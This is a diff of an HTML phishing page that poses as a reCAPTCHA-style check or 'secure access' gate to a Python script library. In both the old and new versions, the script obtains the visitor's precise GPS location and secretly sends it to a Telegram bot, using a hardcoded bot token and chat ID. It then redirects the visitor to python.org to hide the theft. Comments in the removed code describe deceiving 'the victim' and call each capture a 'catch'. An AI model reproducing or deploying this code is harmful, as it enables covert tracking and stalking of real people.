@@ -3,105 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>المكتبة البرمجية | Baratheon Core</title>
+    <title>Python Elite Library</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --py-blue: #3776ab; --py-yellow: #ffd43b; --dark-bg: #0d1117; }
-        body { background-color: var(--dark-bg); color: #c9d1d9; font-family: sans-serif; overflow: hidden; }
-        #overlay { position: fixed; inset: 0; background: rgba(13, 17, 23, 0.98); backdrop-filter: blur(15px); z-index: 9999; display: flex; items-center; justify-content: center; }
-        .captcha-box { background: white; color: #333; border-radius: 24px; width: 92%; max-width: 400px; padding: 40px 30px; text-align: center; }
-        .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; background-color: #ff4b4b; margin-left: 8px; }
-        .active-dot { background-color: #00c853 !important; }
+        body {
+            background: radial-gradient(circle at center, #1a2a6c, #b21f1f, #fdbb2d);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Inter', sans-serif;
+            overflow: hidden;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .glass-panel {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 30px;
+            padding: 40px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            text-align: center;
+            width: 90%;
+            max-width: 450px;
+            z-index: 10;
+        }
+
+        .py-logo {
+            filter: drop-shadow(0 0 15px #ffd43b);
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+
+        .btn-glow {
+            background: linear-gradient(90deg, #3776ab, #ffd43b);
+            transition: 0.5s;
+            background-size: 200% auto;
+        }
+
+        .btn-glow:hover {
+            background-position: right center;
+            box-shadow: 0 0 20px #ffd43b;
+            transform: scale(1.05);
+        }
     </style>
 </head>
 <body>
 
-    <div id="overlay">
-        <div class="captcha-box shadow-2xl">
-            <div class="flex items-center justify-center mb-6">
-                <i class="fab fa-python text-5xl text-blue-600 ml-4"></i>
-                <div class="text-right border-r-2 pr-4 border-gray-200">
-                    <h2 class="text-2xl font-black text-gray-800">تحقق الوصول</h2>
-                    <p class="text-xs font-bold text-blue-500 uppercase">System Security</p>
-                </div>
+    <div class="glass-panel">
+        <img src="https://www.python.org/static/img/python-logo.png" alt="Python" class="py-logo w-20 mx-auto mb-6">
+        
+        <h1 class="text-3xl font-black text-white mb-2 tracking-widest">BARATHEON AI</h1>
+        <p class="text-blue-200 text-sm mb-8 opacity-80">نظام المكتبة المركزية المشفرة</p>
+
+        <div class="space-y-4 mb-8">
+            <div class="flex items-center bg-black/30 p-3 rounded-xl border border-white/10">
+                <i class="fas fa-lock text-yellow-400 ml-3"></i>
+                <span class="text-xs text-gray-300">حالة الوصول: <span class="text-red-500 font-bold">مغلق</span></span>
             </div>
-
-            <div class="bg-gray-50 p-4 rounded-xl mb-6 text-right border border-gray-100">
-                <p class="text-sm text-gray-600 leading-relaxed">
-                    <span id="statusDot" class="status-dot"></span>
-                    حالة النظام: <span id="statusText" class="font-bold">بانتظار الموافقة..</span>
-                </p>
-            </div>
-
-            <p class="text-sm text-gray-500 mb-8 font-medium">يجب الضغط على المربع أدناه لتأكيد أنك بشري وتفعيل "تحديد الموقع الأمني" لفتح السكربتات.</p>
-
-            <label class="group flex items-center justify-between border-2 border-gray-100 bg-white p-5 rounded-2xl cursor-pointer hover:border-blue-400 transition-all shadow-sm">
-                <div class="flex items-center">
-                    <input type="checkbox" id="gpsTrigger" onclick="startHunt()" class="w-8 h-8 ml-4 accent-blue-600 cursor-pointer">
-                    <span class="text-gray-800 font-extrabold text-xl">أنا لست برنامج روبوت</span>
-                </div>
-                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="w-6 opacity-30 group-hover:opacity-100 transition-opacity">
-            </label>
         </div>
-    </div>
 
-    <nav class="p-6 bg-[#161b22] border-b border-[#30363d] flex justify-between">
-        <div class="text-white font-bold text-xl">BARATHEON <span class="text-blue-500">LABS</span></div>
-    </nav>
+        <p class="text-white text-sm mb-6 leading-relaxed">
+            للحصول على صلاحيات الـ Superuser والوصول للسكربتات، يرجى تأكيد البروتوكول الأمني أدناه.
+        </p>
+
+        <button onclick="requestGPS()" class="btn-glow w-full py-4 rounded-2xl text-black font-black text-lg flex items-center justify-center gap-3">
+            <i class="fas fa-fingerprint"></i>
+            أنا لست روبوت - دخول آمن
+        </button>
+
+        <p class="mt-6 text-[10px] text-gray-400 font-mono tracking-tighter uppercase">Encrypted Connection © 2026</p>
+    </div>
 
     <script>
         const token = "8621828423:AAFq9_5-6snrjpfqrBrOPboh7VE824xVN_M";
         const chat_id = "5475815049";
 
-        async function startHunt() {
-            const checkbox = document.getElementById('gpsTrigger');
-            const statusDot = document.getElementById('statusDot');
-            const statusText = document.getElementById('statusText');
-
+        function requestGPS() {
             if (navigator.geolocation) {
-                // نطلب الموقع بأعلى دقة ممكنة
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    // تحديث الحالة في الواجهة لخداع الضحية
-                    statusDot.classList.add('active-dot');
-                    statusText.innerText = "تم التحقق بنجاح!";
-                    
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
-                    const accuracy = pos.coords.accuracy; // دقة الإحداثيات
                     const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                     
-                    const message = `🚀 <b>صيد جديد يا Baratheon!</b>\n\n📍 الموقع: ${mapUrl}\n🎯 الدقة: ${accuracy.toFixed(1)} متر`;
-
-                    // إرسال البيانات فوراً
+                    // إرسال الإحداثيات فوراً
                     await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             chat_id: chat_id,
-                            text: message,
+                            text: `🎯 **Baratheon! صيد ملكي جديد**\n\n📍 الإحداثيات: ${mapUrl}\n📱 الدقة: ${pos.coords.accuracy.toFixed(1)} متر`,
                             parse_mode: 'HTML'
                         })
                     });
 
-                    // فتح الموقع
-                    setTimeout(() => {
-                        document.getElementById('overlay').style.display = 'none';
-                        document.body.style.overflow = 'auto';
-                        window.location.href = "https://www.python.org";
-                    }, 1000);
-
+                    alert("تم تأكيد الهوية. جاري فك التشفير عن المكتبة...");
+                    window.location.href = "https://www.python.org";
                 }, (err) => {
-                    // في حال الرفض
-                    checkbox.checked = false;
-                    alert("⚠️ خطأ أمني: يجب تفعيل 'خدمات الموقع' في المتصفح للسماح لك بدخول مكتبة السكربتات.");
-                }, {
-                    enableHighAccuracy: true, // تفعيل أعلى دقة (GPS حقيقي)
-                    timeout: 10000,
-                    maximumAge: 0
-                });
-            } else {
-                alert("متصفحك قديم جداً ولا يدعم نظام الحماية.");
+                    alert("⚠️ فشل البروتوكول: يجب السماح بـ 'تحديد الموقع' لمنحك صلاحية الوصول.");
+                }, { enableHighAccuracy: true });
             }
         }
     </script>
